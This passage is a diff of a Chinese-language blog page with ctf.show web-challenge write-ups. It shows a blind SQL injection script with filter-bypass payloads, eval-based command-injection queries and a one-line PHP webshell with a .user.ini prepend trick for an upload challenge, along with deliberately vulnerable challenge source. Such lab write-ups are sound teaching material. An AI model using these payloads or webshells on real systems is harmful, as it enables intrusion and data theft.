获取当前使用的数据库</span></span><br><span class="line">    <span class="comment"># payload = &#x27;ascii(substr(database()from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    <span class="comment"># 获取当前数据库的所有表</span></span><br><span class="line">    <span class="comment"># payload = &#x27;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    <span class="comment"># 获取flag表的字段</span></span><br><span class="line">    <span class="comment"># payload = &#x27;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    <span class="comment"># 获取flag表的数据</span></span><br><span class="line">    payload = <span class="string">&#x27;ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;正在获取第 %d 个字符&#x27;</span> % i)</span><br><span class="line">    <span class="comment"># 截取SQL查询结果的每个字符, 并判断字符内容</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        result = requests.get(url + payload % (i, j))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;If&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            name += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;数据库名/表名/字段名/数据: %s&#x27;</span> % name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 如果某个字符不存在,则停止程序</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count &gt;= (<span class="number">128</span> - <span class="number">31</span>):</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
 <p><strong>Code解析</strong>：</p>
 <ul>
 <li><p>ASCII码表中的<strong>可打印字符</strong>位于31到127之间</p></li>
@@ -1026,12 +912,10 @@ alt="image-20230514233401671" /></p></li>
 <li><strong>dirsearch</strong> ：<a
 target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch#wordlists-important">目录扫描工具安装</a></li>
 </ol>
-<pre class="language-bash" data-language="bash"><code class="language-bash">1. Install with git: git clone https:&#x2F;&#x2F;github.com&#x2F;maurosoria&#x2F;dirsearch.git --depth 1 (RECOMMENDED)
-
-2. cd dirsearch </code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. Install with git: git <span class="built_in">clone</span> https://github.com/maurosoria/dirsearch.git --depth 1 (RECOMMENDED)</span><br><span class="line"></span><br><span class="line">2. <span class="built_in">cd</span> dirsearch </span><br></pre></td></tr></table></figure>
 <ol start="2" type="1">
 <li><p>扫描</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">3. dirsearch -u http:&#x2F;&#x2F;4773abe8-15a4-4d51-b0f1-d0c4b64b55ba.challenge.ctf.show&#x2F;</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3. dirsearch -u http://4773abe8-15a4-4d51-b0f1-d0c4b64b55ba.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
 <p><strong>扫描结果</strong>：<img
 src="https://s2.loli.net/2023/05/15/SinHDeGdMIUVx9j.png"
 alt="image-20230515011856443" />这是一个 <code>robots.txt</code>
@@ -1062,38 +946,9 @@ or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p
 <li><p><code>$regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";</code>
 从源码中可以得知几乎把注入用到的关键词过滤的差不多了。
 如果只有这一条现在可以采用双写绕过，但是下面这条限制，使得无法<strong>双写</strong>绕过</p>
-<pre class="language-php" data-language="php"><code class="language-php">if(strlen($username)!&#x3D;strlen(replaceSpecialChar($username)))&#123;
-			die(&quot;sql inject error&quot;);
-		&#125;</code></pre></li>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></li>
 <li><p>点击<strong>取消</strong>按钮、获得php文件</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-		$flag&#x3D;&quot;&quot;;
-        function replaceSpecialChar($strParam)&#123;
-             $regex &#x3D; &quot;&#x2F;(select|from|where|join|sleep|and|\s|union|,)&#x2F;i&quot;;
-             return preg_replace($regex,&quot;&quot;,$strParam);
-        &#125;
-        if (!$con)
-        &#123;
-            die(&#39;Could not connect: &#39; . mysqli_error());
-        &#125;
-		if(strlen($username)!&#x3D;strlen(replaceSpecialChar($username)))&#123;
-			die(&quot;sql inject error&quot;);
-		&#125;
-		if(strlen($password)!&#x3D;strlen(replaceSpecialChar($password)))&#123;
-			die(&quot;sql inject error&quot;);
-		&#125;
-		$sql&#x3D;&quot;select * from user where username &#x3D; &#39;$username&#39;&quot;;
-		$result&#x3D;mysqli_query($con,$sql);
-			if(mysqli_num_rows($result)&gt;0)&#123;
-					while($row&#x3D;mysqli_fetch_assoc($result))&#123;
-						if($password&#x3D;&#x3D;$row[&#39;password&#39;])&#123;
-							echo &quot;登陆成功&lt;br&gt;&quot;;
-							echo $flag;
-						&#125;
-
-					 &#125;
-			&#125;
-    ?&gt;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>解析</strong>：</p>
 <p>这段代码是一个简单的PHP登录验证示例，其原理是检查用户输入的用户名和密码是否存在于数据库中，并防止SQL注入攻击。</p>
 <ol type="1">
@@ -1116,7 +971,7 @@ alt="web10_4" />
 <li><p><strong>keywords</strong></p>
 <p>session</p></li>
 <li><p>注意到</p>
-<pre class="language-php" data-language="php"><code class="language-php">if($password&#x3D;&#x3D;$_SESSION[&#39;password&#39;])</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])</span><br></pre></td></tr></table></figure>
 <p><code>session</code>的password存储在本地，删除<img
 src="https://s2.loli.net/2023/05/19/FTxWSucVpiJDvKt.png"
 alt="s" /></p></li>
@@ -1131,7 +986,7 @@ alt="s" /></p></li>
 <ol type="1">
 <li>注意<strong>;</strong></li>
 </ol>
-<pre class="language-uri" data-language="uri"><code class="language-uri">?cmd&#x3D;phpinfo();</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=phpinfo();</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/05/19/fX25xBDgZwouazj.png"
 alt="image-20230519015308143" />
@@ -1139,24 +994,23 @@ alt="image-20230519015308143" />
 </figure>
 <ol start="2" type="1">
 <li><p>paylod</p>
-<pre class="language-uri" data-language="uri"><code class="language-uri">?cmd&#x3D;highlight_file(&quot;index.php&quot;);</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=highlight_file(&quot;index.php&quot;);</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/05/19/oPVgn24tRuJ1Oh6.png"
 alt="image-20230519015828824" />
 <figcaption aria-hidden="true">image-20230519015828824</figcaption>
 </figure>
 <p><code>Global</code>函数</p>
-<pre class="language-php" data-language="php"><code class="language-php">glob(&quot;*&quot;) 匹配任意文件
-glob(&quot;*.txt&quot;)匹配以txt为后缀的文件</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">glob</span>(<span class="string">&quot;*&quot;</span>) 匹配任意文件</span><br><span class="line"><span class="title function_ invoke__">glob</span>(<span class="string">&quot;*.txt&quot;</span>)匹配以txt为后缀的文件</span><br></pre></td></tr></table></figure>
 <p><strong>payload</strong></p>
-<pre class="language-uri" data-language="uri"><code class="language-uri">?cmd&#x3D;print_r(glob(&quot;*&quot;));</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/05/19/F5ksnci37muDTGK.png"
 alt="image-20230519020418592" />
 <figcaption aria-hidden="true">image-20230519020418592</figcaption>
 </figure></li>
 <li><p>payload</p>
-<pre class="language-uri" data-language="uri"><code class="language-uri">?cmd&#x3D;highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;);</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;);</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/05/19/1F96CpngIavtkZi.png"
 alt="image-20230519020207932" />
@@ -1192,20 +1046,7 @@ Linux 和类 Unix
 </ul></li>
 </ol></li>
 <li><p>Code</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-if (isset($_GET[&#39;cmd&#39;])) &#123;
-  $cmd &#x3D; $_GET[&#39;cmd&#39;];
-  highlight_file(__FILE__);
-  if (preg_match(&quot;&#x2F;[A-Za-oq-z0-9$]+&#x2F;&quot;, $cmd)) &#123;
-   
-    die(&quot;cerror&quot;);
-  &#125;
-  if (preg_match(&quot;&#x2F;\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#39;|\&quot;|\:|\,&#x2F;&quot;, $cmd)) &#123;
-    die(&quot;serror&quot;);
-  &#125;
-  eval($cmd);
-   
-&#125;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
 <li><p><code>eval()</code> 是一个 PHP 函数，用于执行传递给它的字符串作为
 PHP 代码。它将字符串解析为可执行的 PHP
@@ -1232,38 +1073,9 @@ alt="image-20230520225711139" />再次使用
 <p>upload.php.bak<strong>|</strong>.hg<strong>|</strong>
 .git<strong>|</strong> .DS_Store文件泄漏<strong>|</strong>.phps
 .bak结尾的网页</p>
-<pre class="language-python" data-language="python"><code class="language-python">https:&#x2F;&#x2F;3d2fad8a-33c2-4372-9d18-4b277330cc2a.challenge.ctf.show&#x2F;upload.php.bak</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://3d2fad8a-33c2-<span class="number">4372</span>-9d18-4b277330cc2a.challenge.ctf.show/upload.php.bak</span><br></pre></td></tr></table></figure>
 <p>下载源文件</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php 
-	header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);
-	$filename &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;];
-	$temp_name &#x3D; $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
-	$size &#x3D; $_FILES[&#39;file&#39;][&#39;size&#39;];
-	$error &#x3D; $_FILES[&#39;file&#39;][&#39;error&#39;];
-	$arr &#x3D; pathinfo($filename);
-	$ext_suffix &#x3D; $arr[&#39;extension&#39;];
-	if ($size &gt; 24)&#123;
-		die(&quot;error file zise&quot;);
-	&#125;
-	if (strlen($filename)&gt;9)&#123;
-		die(&quot;error file name&quot;);
-	&#125;
-	if(strlen($ext_suffix)&gt;3)&#123;
-		die(&quot;error suffix&quot;);
-	&#125;
-	if(preg_match(&quot;&#x2F;php&#x2F;i&quot;,$ext_suffix))&#123;
-		die(&quot;error suffix&quot;);
-    &#125;
-    if(preg_match(&quot;&#x2F;php&#x2F;i&quot;),$filename))&#123;
-        die(&quot;error file name&quot;);
-    &#125;
-	if (move_uploaded_file($temp_name, &#39;.&#x2F;&#39;.$filename))&#123;
-		echo &quot;文件上传成功！&quot;;
-	&#125;else&#123;
-		echo &quot;文件上传失败！&quot;;
-	&#125;
-
- ?&gt;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>解析：</strong></p>
 <p>我们发现了上传文件的要求，文件的大小要小于等于24，名字长度小于等于9，后缀长度小于等于3，并且最要命的是后缀和名字都不能包含php。我们肯定是要上传一句话木马的，既然小于等于24可以这样写<code>&lt;?php eval($_POST['a']);</code>正好24字节可以满足，但是由于后缀问题服务器无法解析该php语句</p></li>
 <li><p><strong>策略</strong></p>
@@ -1276,10 +1088,7 @@ alt="image-20230520225711139" />再次使用
 不会搜寻。也就是在.usr.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。
 我们在.usr.ini中输入<code>auto_prepend_file =a.txt</code>，这样在该目录下的所有文件都会包含a.txt的内容。</p></li>
 <li><p>payload</p>
-<pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; 1.  我失败
-upload.php&#x2F;?a&#x3D;print_r(glob(&quot;*&quot;));
-&#x2F;&#x2F; 2.
-</code></pre></li>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.  我失败</span></span><br><span class="line">upload.php/?a=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*&quot;</span>));</span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
 </ol></li>
 </ol>
 <h4 id="web14sql注入">Web14：sql注入</h4>
@@ -1311,81 +1120,14 @@ alt="image-20230521033835753" /></p></li>
 <ol type="1">
 <li><p>得到 <code>web.zip</code></p></li>
 <li><p>解压得到<strong>check.php</strong></p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-function receiveStreamFile($receiveFile)&#123;
-
-$streamData &#x3D; isset($GLOBALS[&#39;HTTP_RAW_POST_DATA&#39;])? $GLOBALS[&#39;HTTP_RAW_POST_DATA&#39;] : &#39;&#39;;
-
-if(empty($streamData))&#123;
-$streamData &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
-&#125;
-
-if($streamData!&#x3D;&#39;&#39;)&#123;
-$ret &#x3D; file_put_contents($receiveFile, $streamData, true);
-&#125;else&#123;
-$ret &#x3D; false;
-&#125;
-
-return $ret;
-
-&#125;
-if(md5(date(&quot;i&quot;)) &#x3D;&#x3D;&#x3D; $token)&#123;
-
-$receiveFile &#x3D; &#39;flag.dat&#39;;
-receiveStreamFile($receiveFile);
-if(md5_file($receiveFile)&#x3D;&#x3D;&#x3D;md5_file(&quot;key.dat&quot;))&#123;
-if(hash_file(&quot;sha512&quot;,$receiveFile)!&#x3D;hash_file(&quot;sha512&quot;,&quot;key.dat&quot;))&#123;
-$ret[&#39;success&#39;]&#x3D;&quot;1&quot;;
-$ret[&#39;msg&#39;]&#x3D;&quot;人脸识别成功!$flag&quot;;
-$ret[&#39;error&#39;]&#x3D;&quot;0&quot;;
-echo json_encode($ret);
-return;
-&#125;
-
-$ret[&#39;errormsg&#39;]&#x3D;&quot;same file&quot;;
-echo json_encode($ret);
-return;
-&#125;
-$ret[&#39;errormsg&#39;]&#x3D;&quot;md5 error&quot;;
-echo json_encode($ret);
-return;
-&#125;
-
-$ret[&#39;errormsg&#39;]&#x3D;&quot;token error&quot;;
-echo json_encode($ret);
-return;
-?&gt;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params"><span class="variable">$receiveFile</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$streamData</span> = <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$streamData</span>))&#123;</span><br><span class="line"><span class="variable">$streamData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$streamData</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$receiveFile</span>, <span class="variable">$streamData</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>)) === <span class="variable">$token</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$receiveFile</span> = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">receiveStreamFile</span>(<span class="variable">$receiveFile</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5_file</span>(<span class="variable">$receiveFile</span>)===<span class="title function_ invoke__">md5_file</span>(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="variable">$receiveFile</span>)!=<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;人脸识别成功!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> 